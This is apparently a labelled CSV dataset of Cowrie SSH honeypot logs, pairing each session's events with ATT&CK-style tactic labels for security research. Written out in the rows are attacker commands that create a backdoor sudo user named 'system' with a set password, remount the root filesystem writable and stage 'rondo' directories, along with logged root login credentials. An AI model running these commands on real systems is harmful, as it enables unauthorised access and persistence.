,event,session_id,session,labels
268,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T23:05:37.676317Z"", ""session_id"": ""4b9f09c117f5""}",4b9f09c117f5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 mxB8EXYM) system  && sudo usermod -aG sudo system ; openssl passwd -1 mxB8EXYM;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
269,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 mxB8EXYM) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 mxB8EXYM) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T23:05:37.676756Z"", ""session_id"": ""4b9f09c117f5""}",4b9f09c117f5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 mxB8EXYM) system  && sudo usermod -aG sudo system ; openssl passwd -1 mxB8EXYM;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
270,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 mxB8EXYM"", ""message"": ""CMD: openssl passwd -1 mxB8EXYM"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T23:05:37.677166Z"", ""session_id"": ""4b9f09c117f5""}",4b9f09c117f5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 mxB8EXYM) system  && sudo usermod -aG sudo system ; openssl passwd -1 mxB8EXYM;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
271,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 mxB8EXYM"", ""message"": ""Command not found: openssl passwd -1 mxB8EXYM"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T23:05:37.677817Z"", ""session_id"": ""4b9f09c117f5""}",4b9f09c117f5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 mxB8EXYM) system  && sudo usermod -aG sudo system ; openssl passwd -1 mxB8EXYM;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
272,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/2a048e30d92d93cb04d690ac1188e2a55290c86baab6e89ffadd88a6765ab53a after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""2a048e30d92d93cb04d690ac1188e2a55290c86baab6e89ffadd88a6765ab53a"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T23:05:37.783309Z"", ""ttylog"": ""var/lib/cowrie/tty/2a048e30d92d93cb04d690ac1188e2a55290c86baab6e89ffadd88a6765ab53a"", ""session_id"": ""4b9f09c117f5""}",4b9f09c117f5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 mxB8EXYM) system  && sudo usermod -aG sudo system ; openssl passwd -1 mxB8EXYM;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
273,"{""duration"": ""0.9"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.9 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T23:05:37.783920Z"", ""session_id"": ""4b9f09c117f5""}",4b9f09c117f5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 mxB8EXYM) system  && sudo usermod -aG sudo system ; openssl passwd -1 mxB8EXYM;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
274,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:48769 (10.42.6.15:2222) [session: 60c7f61cf01c]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 48769.0, ""timestamp"": ""2025-08-06T21:36:22.127857Z"", ""session_id"": ""60c7f61cf01c""}",60c7f61cf01c,"mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F;","['Discovery', 'Execution', 'Initial Access', 'Privilege Escalation']"
275,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-OpenSSH"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T21:36:22.132609Z"", ""version"": ""SSH-2.0-OpenSSH"", ""session_id"": ""60c7f61cf01c""}",60c7f61cf01c,"mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F;","['Discovery', 'Execution', 'Initial Access', 'Privilege Escalation']"
276,"{""compCS"": [""none""], ""encCS"": [""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr"", ""aes128-cbc"", ""aes192-cbc"", ""aes256-cbc"", ""3des-cbc"", ""aes128-gcm@openssh.com"", ""aes256-gcm@openssh.com""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""a2de0f306611e0957be704f5b0e35a82"", ""hashAlgorithms"": ""curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,aes192-cbc,aes256-cbc,3des-cbc,aes128-gcm@openssh.com,aes256-gcm@openssh.com;hmac-sha2-256,hmac-sha2-512,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1,hmac-md5,hmac-sha1-96,hmac-md5-96;none"", ""kexAlgs"": [""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group16-sha512"", ""diffie-hellman-group-exchange-sha256"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group-exchange-sha1"", ""diffie-hellman-group14-sha1"", ""diffie-hellman-group1-sha1"", ""ext-info-c"", ""kex-strict-c-v00@openssh.com""], ""keyAlgs"": [""ssh-ed25519"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256"", ""hmac-sha2-512"", ""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-512-etm@openssh.com"", ""hmac-sha1"", ""hmac-md5"", ""hmac-sha1-96"", ""hmac-md5-96""], ""message"": ""SSH client hassh fingerprint: a2de0f306611e0957be704f5b0e35a82"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T21:36:22.272719Z"", ""session_id"": ""60c7f61cf01c""}",60c7f61cf01c,"mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F;","['Discovery', 'Execution', 'Initial Access', 'Privilege Escalation']"
277,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/t0talc0ntr0l4!] succeeded"", ""password"": ""t0talc0ntr0l4!"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T21:36:22.828022Z"", ""username"": ""root"", ""session_id"": ""60c7f61cf01c""}",60c7f61cf01c,"mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F;","['Discovery', 'Execution', 'Initial Access', 'Privilege Escalation']"
278,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T21:36:23.153760Z"", ""session_id"": ""60c7f61cf01c""}",60c7f61cf01c,"mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F;","['Discovery', 'Execution', 'Initial Access', 'Privilege Escalation']"
279,"{""eventid"": ""cowrie.command.input"", ""input"": ""mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F"", ""message"": ""CMD: mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T21:36:23.155035Z"", ""session_id"": ""60c7f61cf01c""}",60c7f61cf01c,"mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F;","['Discovery', 'Execution', 'Initial Access', 'Privilege Escalation']"
280,"{""duplicate"": false, ""duration"": ""0.2"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/082b6dc11607b3ee9a93fbf8847031a7aea50df5f663993b8c79d209bb1266d4 after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""082b6dc11607b3ee9a93fbf8847031a7aea50df5f663993b8c79d209bb1266d4"", ""size"": 600.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T21:36:23.327782Z"", ""ttylog"": ""var/lib/cowrie/tty/082b6dc11607b3ee9a93fbf8847031a7aea50df5f663993b8c79d209bb1266d4"", ""session_id"": ""60c7f61cf01c""}",60c7f61cf01c,"mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F;","['Discovery', 'Execution', 'Initial Access', 'Privilege Escalation']"
281,"{""duration"": ""1.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T21:36:23.332575Z"", ""session_id"": ""60c7f61cf01c""}",60c7f61cf01c,"mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F;","['Discovery', 'Execution', 'Initial Access', 'Privilege Escalation']"
282,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:32053 (10.42.4.33:2222) [session: 8f2e06ac7276]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 32053.0, ""timestamp"": ""2025-08-08T09:13:46.826147Z"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
283,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:46.826720Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
284,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:46.930418Z"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
285,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:47.245780Z"", ""username"": ""root"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
286,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:47.470614Z"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
287,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:47.470982Z"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
288,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 pSeg5Ree"", ""message"": ""CMD: openssl passwd -1 pSeg5Ree"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:47.471306Z"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
289,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 pSeg5Ree"", ""message"": ""Command not found: openssl passwd -1 pSeg5Ree"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:47.472020Z"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
290,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/1041853199b252dd85ebe45d4d27dbb44347720ab3a5d7b0efe22e1bc93ac717 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""1041853199b252dd85ebe45d4d27dbb44347720ab3a5d7b0efe22e1bc93ac717"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:47.577233Z"", ""ttylog"": ""var/lib/cowrie/tty/1041853199b252dd85ebe45d4d27dbb44347720ab3a5d7b0efe22e1bc93ac717"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
291,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:47.578990Z"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
292,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:19333 (10.42.4.33:2222) [session: ef092aa433ff]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 19333.0, ""timestamp"": ""2025-08-11T21:51:13.680758Z"", ""session_id"": ""ef092aa433ff""}",ef092aa433ff,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 DHMp6YNb) system  && sudo usermod -aG sudo system ; openssl passwd -1 DHMp6YNb;,"['Discovery', 'Execution', 'Persistence', 'Initial Access', 'Privilege Escalation']"
293,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T21:51:13.842566Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""ef092aa433ff""}",ef092aa433ff,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 DHMp6YNb) system  && sudo usermod -aG sudo system ; openssl passwd -1 DHMp6YNb;,"['Discovery', 'Execution', 'Persistence', 'Initial Access', 'Privilege Escalation']"
294,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T21:51:13.843136Z"", ""session_id"": ""ef092aa433ff""}",ef092aa433ff,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 DHMp6YNb) system  && sudo usermod -aG sudo system ; openssl passwd -1 DHMp6YNb;,"['Discovery', 'Execution', 'Persistence', 'Initial Access', 'Privilege Escalation']"
295,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T21:51:14.227779Z"", ""username"": ""root"", ""session_id"": ""ef092aa433ff""}",ef092aa433ff,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 DHMp6YNb) system  && sudo usermod -aG sudo system ; openssl passwd -1 DHMp6YNb;,"['Discovery', 'Execution', 'Persistence', 'Initial Access', 'Privilege Escalation']"
296,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T21:51:14.476022Z"", ""session_id"": ""ef092aa433ff""}",ef092aa433ff,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 DHMp6YNb) system  && sudo usermod -aG sudo system ; openssl passwd -1 DHMp6YNb;,"['Discovery', 'Execution', 'Persistence', 'Initial Access', 'Privilege Escalation']"
